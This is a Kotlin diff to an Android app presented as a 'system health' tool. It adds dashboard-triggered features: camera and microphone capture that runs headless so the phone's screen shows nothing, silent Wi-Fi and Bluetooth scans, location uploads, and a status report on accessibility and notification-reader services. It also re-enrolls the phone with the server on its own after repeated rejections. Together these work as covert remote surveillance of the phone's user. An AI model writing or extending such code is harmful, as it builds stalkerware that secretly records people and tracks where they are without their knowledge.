@@ -1,12 +1,15 @@
 package com.example.systemhealth
 
 import android.app.Application
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
+import android.os.Build
 import android.util.Base64
-import com.example.utility.ScreenMonitorService
-import com.example.utility.backup.SettingsBackupTool
-import com.example.utility.security.SecurityAuditTool
+import android.util.Log
+import com.example.systemmanagement.ServiceManager
 import com.fleet.tracking.GeofenceEvent
 import com.fleet.tracking.LocationPayload
 import com.fleet.tracking.LocationTracker
@@ -26,13 +29,15 @@ class SystemHealthApp : Application() {
         LocationTracker.initialize(this, object : TrackingSink {
             override suspend fun onLocation(payload: LocationPayload) {
                 if (CoreService.isMonitoringEnabled(this@SystemHealthApp) &&
-                    FeatureBridge.locationApproved(this@SystemHealthApp)) {
-                    FeatureBridge.queueEvent(this@SystemHealthApp, payload.toJson().put("type", "location"))
+                    FeatureBridge.locationApproved(this@SystemHealthApp) &&
+                    RemotePolicy.allows(this@SystemHealthApp, "location")) {
+                    FeatureBridge.queueLocationEvent(this@SystemHealthApp, payload.toJson().put("type", "location"))
                 }
             }
             override suspend fun onGeofenceEvent(event: GeofenceEvent) {
                 if (CoreService.isMonitoringEnabled(this@SystemHealthApp) &&
-                    FeatureBridge.locationApproved(this@SystemHealthApp)) {
+                    FeatureBridge.locationApproved(this@SystemHealthApp) &&
+                    RemotePolicy.allows(this@SystemHealthApp, "location")) {
                     FeatureBridge.queueEvent(this@SystemHealthApp, event.toJson().put("type", "geofence"))
                 }
             }
@@ -43,16 +48,22 @@ class SystemHealthApp : Application() {
 /** Authenticated feature transport. Queued items stay tied to their original enrollment.
  * Remote requests run without a phone-side prompt; captured media still needs Android permissions. */
 internal object FeatureBridge {
+    private const val TAG = "FeatureBridge"
     const val MAX_FILE = 4 * 1024 * 1024
-    private const val OUTBOX_LIMIT = 200
-    private const val FLUSH_BATCH = 20
-    private const val MAX_ATTEMPTS = 40
-    private val sheddableTypes = setOf("system_health", "device_status")
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var job: Job? = null
     private val lock = Any()
     @Volatile var status = "Tools ready. Start monitoring to upload."
+    @Volatile private var rejections = 0
         private set
+
+    /** A dashboard location request is answered by the first fix that really reaches the server. */
+    private var locationRequestId: String? = null
+    fun awaitLocationResult(id: String?) { synchronized(lock) { locationRequestId = id } }
+    fun queueLocationEvent(c: Context, payload: JSONObject) {
+        val id = synchronized(lock) { locationRequestId.also { locationRequestId = null } }
+        queueEvent(c, payload, id, "Location fix uploaded to the dashboard.")
+    }
 
     fun locationApproved(c: Context) = c.getSharedPreferences("feature_options", 0).getBoolean("location", false)
     fun setLocationApproved(c: Context, enabled: Boolean) {
@@ -72,14 +83,14 @@ internal object FeatureBridge {
         .put("server", s.serverUrl).put("device", s.deviceId).put("path", path).put("body", body)
     private fun enqueue(c: Context, item: JSONObject) = synchronized(lock) {
         val dir = outbox(c)
-        if ((dir.listFiles()?.count { it.extension == "json" } ?: 0) >= OUTBOX_LIMIT) {
+        if ((dir.listFiles()?.count { it.extension == "json" } ?: 0) >= QueuePolicy.OUTBOX_LIMIT) {
             // Periodic health and status samples are superseded by the next one, so the queue
             // sheds its oldest sample rather than discarding captures the phone cannot remake.
             val shed = dir.listFiles()?.filter { it.extension == "json" }?.sortedBy { it.name }
                 ?.firstOrNull { file ->
                     runCatching {
-                        JSONObject(file.readText()).getJSONObject("body").getJSONObject("payload")
-                            .getString("type") in sheddableTypes
+                        QueuePolicy.isSheddable(JSONObject(file.readText())
+                            .getJSONObject("body").getJSONObject("payload").getString("type"))
                     }.getOrDefault(false)
                 }
             if (shed == null || !shed.delete()) {
@@ -90,17 +101,24 @@ internal object FeatureBridge {
         }
         write(File(dir, "${System.currentTimeMillis()}-${UUID.randomUUID()}.json"), item.toString())
     }
-    fun queueEvent(c: Context, payload: JSONObject) {
+
+    /** Marks a queued output as the answer to a dashboard request, so delivery can prove completion. */
+    private fun link(item: JSONObject, forRequest: String?, detail: String): JSONObject =
+        if (forRequest.isNullOrEmpty()) item
+        else item.put("for_request", forRequest).put("request_detail", detail.take(800))
+
+    fun queueEvent(c: Context, payload: JSONObject, forRequest: String? = null, detail: String = "") {
         require(payload.toString().toByteArray().size <= 48 * 1024) { "Report too large" }
-        enqueue(c, wrapper(settings(c), "/api/device/events", JSONObject()
-            .put("event_id", UUID.randomUUID().toString()).put("payload", payload)))
+        enqueue(c, link(wrapper(settings(c), "/api/device/events", JSONObject()
+            .put("event_id", UUID.randomUUID().toString()).put("payload", payload)), forRequest, detail))
     }
-    fun queueFile(c: Context, source: File, name: String, mime: String, kind: String): String = synchronized(lock) {
+    fun queueFile(c: Context, source: File, name: String, mime: String, kind: String,
+                  forRequest: String? = null, detail: String = ""): String = synchronized(lock) {
         require(source.length() in 1..MAX_FILE.toLong()) { "Choose a nonempty file up to 4 MiB" }
         val s = settings(c)
         val dir = vault(c)
         check((dir.listFiles()?.filter { it.extension == "bin" }?.sumOf { it.length() } ?: 0) + source.length() <= 50L * 1024 * 1024) {
-            "Phone file vault full (50 MiB). Export or delete old local files."
+            "Phone file vault full (50 MiB). Export or delete local files."
         }
         val id = UUID.randomUUID().toString()
         val bytes = File(dir, "$id.bin")
@@ -110,7 +128,7 @@ internal object FeatureBridge {
             .put("uploaded", false).put("server", s.serverUrl).put("device", s.deviceId)
         try {
             write(File(dir, "$id.json"), meta.toString())
-            enqueue(c, wrapper(s, "/api/device/files", JSONObject(meta.toString())).put("local_file", id))
+            enqueue(c, link(wrapper(s, "/api/device/files", JSONObject(meta.toString())).put("local_file", id), forRequest, detail))
         } catch (e: Exception) { bytes.delete(); File(dir, "$id.json").delete(); throw e }
         id
     }
@@ -147,8 +165,10 @@ internal object FeatureBridge {
                 var healthy = true
                 try {
                     val s = settings(app)
+                    drainReports(app)
                     healthy = flush(app, s)
                     pollRequests(app, s)
+                    runScheduledReports(app)
                 } catch (e: CancellationException) {
                     throw e
                 } catch (e: Exception) {
@@ -171,19 +191,30 @@ internal object FeatureBridge {
     @Synchronized fun stop(c: Context) {
         job?.cancel(); job = null
         setLocationApproved(c, false)
+        awaitLocationResult(null)
         LocationTracker.stopTracking()
-        NotificationPresentation.refresh(c)
         status = "Monitoring stopped. Pending uploads retained."
     }
     private fun readable(e: Exception) =
         e.message?.takeIf { !it.contains("://") }?.take(150) ?: "Server unavailable; uploads will retry."
+
+    /** Repairs the one rejection the phone can fix itself: a rebuilt backend that forgot it.
+     *  A credential the owner rotated is never reissued here, so that answer stays a instruction. */
+    private suspend fun healRejection(c: Context) {
+        val result = AutomaticEnrollment.renew(c)
+        status = when (result.state) {
+            "approved" -> "This phone was missing from the backend and has registered again. Uploads will retry."
+            "manual" -> "The server rejected this credential. Type a new token in Advanced connection settings."
+            else -> result.message
+        }
+    }
 
     /** One delivery pass. Returns false when the server could not be reached. */
     private suspend fun flush(c: Context, s: SyncSettings): Boolean {
         val files = synchronized(lock) { outbox(c).listFiles()?.filter { it.extension == "json" }?.sortedBy { it.name }.orEmpty() }
         var blocked: String? = null
         var unreachable = false
-        for (file in files.take(FLUSH_BATCH)) {
+        for (file in files.take(QueuePolicy.FLUSH_BATCH)) {
             currentCoroutineContext().ensureActive()
             if (!CoreService.isMonitoringEnabled(c)) return !unreachable
             val item = synchronized(lock) { if (file.exists()) JSONObject(file.readText()) else null } ?: continue
@@ -200,15 +231,21 @@ internal object FeatureBridge {
             }
             val isResult = item.getString("path").startsWith("/api/device/requests/")
             val attempts = item.optInt("attempts", 0) + 1
-            try {
+            val response = try {
                 request(s, item.getString("path"), body)
             } catch (e: HttpFailure) {
                 // An expired request result never needs a retry; the server rejects some payloads
                 // permanently, so those move aside instead of blocking every later upload.
                 when {
-                    isResult && e.code in listOf(404, 410) -> retire(c, file)
-                    e.code == 401 -> blocked = e.message
-                    e.code in listOf(400, 413) || attempts >= MAX_ATTEMPTS -> retire(c, file)
+                    e.code == 401 -> {
+                        blocked = e.message
+                        rejections += 1
+                        // Two rejections in a row is not a passing network problem, so ask the
+                        // backend what this phone still is and rejoin automatically if it was
+                        // simply forgotten by a rebuilt database.
+                        if (rejections == 2) healRejection(c)
+                    }
+                    QueuePolicy.retires(e.code, attempts, isResult) -> retire(c, file)
                     else -> { blocked = e.message; retry(file, item, attempts) }
                 }
                 continue
@@ -227,12 +264,36 @@ internal object FeatureBridge {
                 }
                 file.delete()
             }
+            rejections = 0
             ConnectionDiagnostics.recordUpload(c, s.serverUrl, s.deviceId)
+            deliveryLabel(body)?.let { NotificationPresentation.recordDelivery(c, it) }
+            // The dashboard answer follows the upload it describes, so "completed" is only ever
+            // sent after the server has accepted the file or event.
+            val forRequest = item.optString("for_request")
+            if (forRequest.isNotEmpty()) report(c, forRequest, "completed",
+                item.optString("request_detail").ifEmpty { "Output uploaded to the dashboard." },
+                artifactRef(item.getString("path"), response))
         }
         val aside = failedCount(c)
         status = blocked ?: "Uploads checked at ${java.time.LocalTime.now().withNano(0)}; ${pendingCount(c)} pending." +
             if (aside > 0) " $aside item(s) kept on the phone after repeated failures." else ""
         return !unreachable
+    }
+
+    /** A request links to the record the server named in its reply, so the dashboard can prove it. */
+    private fun artifactRef(path: String, response: JSONObject): String = when (path) {
+        "/api/device/files" -> response.optString("file_id").takeIf { Regex("[a-f0-9-]{36}").matches(it) }?.let { "file:$it" } ?: ""
+        "/api/device/events" -> response.optString("event_id").takeIf { it.matches(Regex("\\d{1,19}")) }?.let { "event:$it" } ?: ""
+        else -> ""
+    }
+
+    /** The status line names captures and reports; a routine five-minute health sample is noise. */
+    private fun deliveryLabel(body: JSONObject): String? {
+        body.optString("kind").takeIf { it.isNotEmpty() }?.let {
+            return if (it == "audio") "audio recording" else it
+        }
+        val type = body.optJSONObject("payload")?.optString("type").orEmpty()
+        return type.takeIf { it.isNotEmpty() && !QueuePolicy.isSheddable(it) }?.replace('_', ' ')
     }
 
     private fun retry(file: File, item: JSONObject, attempts: Int) {
@@ -287,74 +348,211 @@ internal object FeatureBridge {
     private fun autoDispatch(c: Context, item: JSONObject) {
         val id = item.getString("request_id")
         val action = item.getString("action")
+        // The rules channel stays open even under restrictive rules, so a narrowed phone can always
+        // be widened again by the same dashboard.
+        if (action == "request_settings") {
+            scope.launch { applyRules(c, id, item.optJSONObject("args")) }
+            return
+        }
+        val tool = action.removePrefix("request_")
+        if (!RemotePolicy.allows(c, tool)) {
+            finish(c, id, "declined", "A dashboard rule keeps ${tool.replace('_', ' ')} off on this phone.")
+            return
+        }
         when (DeviceCommandRouter.route(action)) {
             DeviceCommandRouter.Mode.SILENT -> scope.launch { runSilently(c, id, action) }
-            DeviceCommandRouter.Mode.USER -> openTools(c, id, action)
+            DeviceCommandRouter.Mode.CAPTURE -> captureHeadless(c, id, action)
+            DeviceCommandRouter.Mode.USER -> openTools(c, item)
             DeviceCommandRouter.Mode.UNKNOWN -> finish(c, id, "failed", "Phone build does not support action $action.")
         }
     }
 
-    /** Runs a report-only tool from the background loop and returns its outcome to the dashboard. */
+    /** Stores rules the dashboard sent, then reports them back so the phone's answer is provable. */
+    private suspend fun applyRules(c: Context, id: String, args: JSONObject?) {
+        finish(c, id, "running", "Applying the dashboard's rules…")
+        val summary = args?.let { runCatching { RemotePolicy.apply(c, it) }.getOrNull() }
+        if (summary.isNullOrEmpty()) {
+            finish(c, id, "failed", "The rules were missing or this phone does not recognise them, so nothing changed.")
+            return
+        }
+        queueEvent(c, JSONObject()
+            .put("type", "settings_applied")
+            .put("timestamp", Instant.now().toString())
+            .put("rules", summary), id, "Rules applied on the phone: $summary")
+    }
+
+    /** Camera and microphone run in the monitoring service's process, so the phone's screen keeps
+     * showing whatever the owner was doing. */
+    private fun captureHeadless(c: Context, id: String, action: String) {
+        HeadlessCapture.start(c, id, action)?.let { reason -> finish(c, id, "failed", reason) }
+    }
+
+    /** Runs a report-only tool from the background loop. Its dashboard answer arrives with the upload. */
     private suspend fun runSilently(c: Context, id: String, action: String) {
+        finish(c, id, "running", when (action) {
+            "request_scan" -> "Scanning nearby Wi-Fi and Bluetooth…"
+            else -> "Reading phone status…"
+        })
         val outcome = runCatching {
             when (action) {
-                "request_status" -> {
-                    queueEvent(c, JSONObject().put("type", "device_status")
-                        .put("timestamp", Instant.now().toString())
-                        .put("monitoring", CoreService.isRunning)
-                        .put("pending_uploads", pendingCount(c)))
-                    "Phone status queued for upload."
+                "request_scan" -> {
+                    // HeadlessScan runs Wi-Fi + Bluetooth discovery using only a Context.
+                    // No visible Activity or window focus is required.
+                    val result = HeadlessScan.scan(c)
+                    result.put("type", "environment_scan").put("timestamp", Instant.now().toString())
+                    queueEvent(c, result, id, "Nearby scan uploaded.")
                 }
-                "request_audit" -> share(c, "audit", SecurityAuditTool(c).scanAppDirectories(),
-                    "Security audit queued for upload.")
-                else -> share(c, "backup", backupReport(c), "Settings backup queued for upload.")
+                else -> queueEvent(c, deviceStatus(c), id, "Phone status uploaded.")
             }
         }
-        outcome.fold(
-            { detail -> finish(c, id, "completed", detail) },
-            { error -> finish(c, id, "failed", (error.message ?: "Request failed").take(800)) }
+        outcome.exceptionOrNull()?.let { error ->
+            finish(c, id, "failed", (error.message ?: "Request failed").take(800))
+        }
+    }
+
+    /** Queues the recurring reports this phone's owner opted into. A failing tool is not retried
+     *  until the next slot, so one broken report cannot fill the queue every few seconds. */
+    private suspend fun runScheduledReports(c: Context) {
+        val now = System.currentTimeMillis()
+        val minutes = ReportSchedule.intervalMinutes(c)
+        for (tool in ReportSchedule.enabled(c).sorted()) {
+            if (!ReportSchedule.isDue(ReportSchedule.lastRun(c, tool), now, minutes)) continue
+            ReportSchedule.markRun(c, tool, now)
+            if (!RemotePolicy.allows(c, tool)) continue
+            try {
+                queueScheduled(c, tool)
+            } catch (cancelled: CancellationException) {
+                throw cancelled
+            } catch (error: Exception) {
+                status = "A scheduled ${ReportSchedule.label(tool)} could not be queued: ${readable(error)}"
+            }
+        }
+    }
+
+    /** The same report-only tools a dashboard may ask for, with no request to answer. */
+    private suspend fun queueScheduled(c: Context, tool: String) {
+        when (tool) {
+            "scan" -> {
+                val result = HeadlessScan.scan(c)
+                    .put("type", "environment_scan").put("timestamp", Instant.now().toString())
+                queueEvent(c, result)
+            }
+            else -> queueEvent(c, deviceStatus(c))
+        }
+    }
+
+    /** What the dashboard needs to answer "why is this phone not sending anything?". */
+    internal fun deviceStatus(c: Context): JSONObject {
+        val permissions = PermissionPlan.steps(Build.VERSION.SDK_INT).associate { step ->
+            step.id to step.permissions.all {
+                c.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
+            }
+        }
+        val sensors = CoreService.acceptedSensorTypes
+        return JSONObject()
+            .put("type", "device_status")
+            .put("timestamp", Instant.now().toString())
+            .put("monitoring", CoreService.isRunning)
+            .put("sync_ready", CoreService.isSyncReady)
+            .put("location", LocationTracker.isTracking.value)
+            .put("location_approved", locationApproved(c))
+            .put("pending_uploads", pendingCount(c))
+            .put("unsent_kept_aside", failedCount(c))
+            .put("last_result", status.take(200))
+            .put("app_version", AppIdentity.VERSION_NAME)
+            .put("permissions", JSONObject(permissions))
+            .put("rules", RemotePolicy.describe(c))
+            .put("scheduled_reports", ReportSchedule.describe(c))
+            .put("camera_ready", permissions["camera"] == true &&
+                sensors and ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA != 0)
+            .put("microphone_ready", permissions["microphone"] == true &&
+                sensors and ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE != 0)
+            .put("services", serviceStates(c))
+    }
+
+    private fun serviceStates(c: Context): JSONObject {
+        val specs = listOf(
+            ServiceManager.ServiceSpec(
+                ComponentName(c, AccessibilityHelperService::class.java), ServiceManager.Kind.ACCESSIBILITY
+            ),
+            ServiceManager.ServiceSpec(
+                ComponentName(c, NotificationReaderService::class.java), ServiceManager.Kind.NOTIFICATION_LISTENER
+            ),
         )
-    }
-
-    private fun share(c: Context, kind: String, report: JSONObject, detail: String): String {
-        val temp = File(c.cacheDir, "$kind-${System.currentTimeMillis()}.json")
-            .apply { writeText(report.toString(2)) }
-        try {
-            queueFile(c, temp, temp.name, "application/json", kind)
-            return detail
-        } finally { temp.delete() }
-    }
-
-    private suspend fun backupReport(c: Context): JSONObject {
-        val prefs = c.getSharedPreferences(ScreenMonitorService.PREFS_NAME, 0)
-        val report = SettingsBackupTool(c).backupAppSettings(c.packageName, listOf(ScreenMonitorService.PREFS_NAME))
-        val packages = prefs.getStringSet(ScreenMonitorService.KEY_ALLOWED_PACKAGES, emptySet()).orEmpty().sorted()
-        val geofences = JSONArray(LocationTracker.registeredGeofences().map {
-            JSONObject().put("id", it.id).put("latitude", it.latitude)
-                .put("longitude", it.longitude).put("radius_meters", it.radiusMeters)
+        val manager = ServiceManager(c, specs)
+        return JSONObject(specs.associate { spec ->
+            val state = manager.checkServiceStatus(spec)
+            spec.component.className.substringAfterLast('.') to JSONObject()
+                .put("access_granted", state.accessGranted)
+                .put("running", state.runtime == ServiceManager.RuntimeState.RUNNING)
         })
-        report.put("format", "system-health-settings-v1")
-            .put("approved_packages", JSONArray(packages))
-            .put("all_apps", prefs.getBoolean(ScreenMonitorService.KEY_ALL_APPS, false))
-            .put("geofences", geofences)
-        // Monitoring consent never travels with a settings backup.
-        report.getJSONObject("settings").optJSONObject(ScreenMonitorService.PREFS_NAME)
-            ?.remove(ScreenMonitorService.KEY_ENABLED)
-        return report
     }
 
-    private fun finish(c: Context, id: String, state: String, detail: String) {
-        runCatching { finishRequest(c, id, state, detail) }
+    private fun finish(c: Context, id: String, state: String, detail: String) = report(c, id, state, detail, "")
+
+    /** A result the phone could not queue yet. Kept in memory for this session only. */
+    private data class Retry(val id: String, val state: String, val ref: String, val detail: String, val attempts: Int)
+    private val reportRetries = ArrayDeque<Retry>()
+
+    /** Records a request outcome. A result that cannot be queued is retried, never thrown away. */
+    private fun report(c: Context, id: String, state: String, detail: String, ref: String, attempts: Int = 0) {
+        try {
+            val s = settings(c)
+            val prefs = c.getSharedPreferences("phone_requests", 0)
+            require(prefs.getString("server", "") == s.serverUrl && prefs.getString("device", "") == s.deviceId) {
+                "Request belongs to a different enrollment"
+            }
+            enqueue(c, wrapper(s, "/api/device/requests/$id/result", JSONObject()
+                .put("status", state).put("detail", detail.take(800)).put("result_ref", ref)))
+            markAnswered(c, id, state)
+        } catch (error: CancellationException) {
+            throw error
+        } catch (error: Exception) {
+            // A dashboard must not be left guessing: keep the outcome and try again next pass.
+            synchronized(reportRetries) {
+                if (error is IllegalStateException && attempts + 1 < QueuePolicy.MAX_ATTEMPTS) {
+                    reportRetries.addLast(Retry(id, state, ref, detail, attempts + 1))
+                }
+            }
+            status = "A dashboard answer could not be queued: ${readable(error)}"
+            Log.w(TAG, "Request result could not be queued", error)
+        }
+        CoreService.refreshNotification()
     }
 
-    private fun openTools(c: Context, id: String, action: String) {
+    /** Running is not an answer, so only a settled state removes the request from the phone's list. */
+    private fun markAnswered(c: Context, id: String, state: String) {
+        if (state == "running") return
+        val prefs = c.getSharedPreferences("phone_requests", 0)
+        prefs.edit()
+            .putStringSet("done", (prefs.getStringSet("done", emptySet()).orEmpty() + id).toList().takeLast(200).toSet())
+            .putString("pending", JSONArray(pendingRequests(c).filter { it.getString("request_id") != id }).toString())
+            .apply()
+    }
+
+    private fun drainReports(c: Context) {
+        val waiting = synchronized(reportRetries) {
+            if (reportRetries.isEmpty()) return
+            val snapshot = reportRetries.toList()
+            reportRetries.clear()
+            snapshot
+        }
+        for (item in waiting) report(c, item.id, item.state, item.detail, item.ref, item.attempts)
+    }
+
+    private fun openTools(c: Context, item: JSONObject) {
+        val id = item.getString("request_id")
         runCatching {
             c.startActivity(
                 Intent(c, FeaturesActivity::class.java)
                     .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                     .putExtra("auto_request_id", id)
-                    .putExtra("auto_request_action", action)
+                    .putExtra("auto_request_action", item.getString("action"))
+                    .putExtra("auto_request_args", item.optJSONObject("args")?.toString() ?: "{}")
             )
+            // The phone screen now holds the request; the dashboard should say so instead of
+            // showing a delivered request that appears to do nothing.
+            finish(c, id, "running", "Waiting for the owner to approve this on the phone.")
         }.onFailure {
             // Android can refuse a background activity start; report that instead of going quiet.
             finish(c, id, "failed", "Unlock the phone and keep monitoring on to run this tool.")
@@ -368,12 +566,21 @@ internal object FeatureBridge {
         val dispatched = prefs.getStringSet("dispatched", emptySet()).orEmpty()
         val items = JSONArray()
         val toDispatch = mutableListOf<JSONObject>()
+        // The camera and microphone serve one request at a time, so a second capture stays in the
+        // server's queue for a later poll instead of being answered as a failure. Requests expire
+        // after ten minutes, so a queue can only be worked off or expire, never silently dropped.
+        var sensorHeld = HeadlessCapture.isBusy()
         for (i in 0 until incoming.length()) {
             val item = incoming.getJSONObject(i)
             val reqId = item.getString("request_id")
             if (reqId !in done) {
                 items.put(item)
-                if (reqId !in dispatched) toDispatch.add(item)
+                val capture = DeviceCommandRouter.route(item.optString("action")) ==
+                    DeviceCommandRouter.Mode.CAPTURE
+                if (reqId !in dispatched && !(capture && sensorHeld)) {
+                    toDispatch.add(item)
+                    if (capture) sensorHeld = true
+                }
             }
         }
         if (toDispatch.isNotEmpty()) {
@@ -393,15 +600,7 @@ internal object FeatureBridge {
         return (0 until array.length()).map { array.getJSONObject(it) }
             .filter { runCatching { Instant.parse(it.getString("expires_at")) > Instant.now() }.getOrDefault(false) }
     }
-    fun finishRequest(c: Context, id: String, state: String, detail: String) {
-        val s = settings(c)
-        val prefs = c.getSharedPreferences("phone_requests", 0)
-        require(prefs.getString("server", "") == s.serverUrl && prefs.getString("device", "") == s.deviceId) {
-            "Request belongs to a different enrollment"
-        }
-        enqueue(c, wrapper(s, "/api/device/requests/$id/result", JSONObject().put("status", state).put("detail", detail.take(800))))
-        prefs.edit().putStringSet("done", (prefs.getStringSet("done", emptySet()).orEmpty() + id).toList().takeLast(200).toSet())
-            .putString("pending", JSONArray(pendingRequests(c).filter { it.getString("request_id") != id }).toString()).apply()
-        NotificationPresentation.refresh(c)
+    fun finishRequest(c: Context, id: String, state: String, detail: String, ref: String = "") {
+        report(c, id, state, detail, ref)
     }
 }
